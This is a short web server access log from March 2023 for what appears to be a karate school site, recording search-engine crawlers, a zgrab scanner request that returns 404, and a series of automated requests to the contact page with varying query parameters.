::ffff:51.222.253.8 - - [22/Mar/2023:12:55:51 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [22/Mar/2023:12:55:52 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:192.241.206.10 - - [22/Mar/2023:13:12:04 +0000] "GET /portal/redlion HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.72.18 - - [22/Mar/2023:13:13:03 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.18 - - [22/Mar/2023:13:13:03 +0000] "GET /schoolsandschedules.html HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.14 - - [22/Mar/2023:13:35:33 +0000] "GET /schoolsandschedules.html HTTP/1.1" 404 163 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:20 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:21 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:21 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:21 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
::ffff:148.72.158.90 - - [22/Mar/2023:13:36:21 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
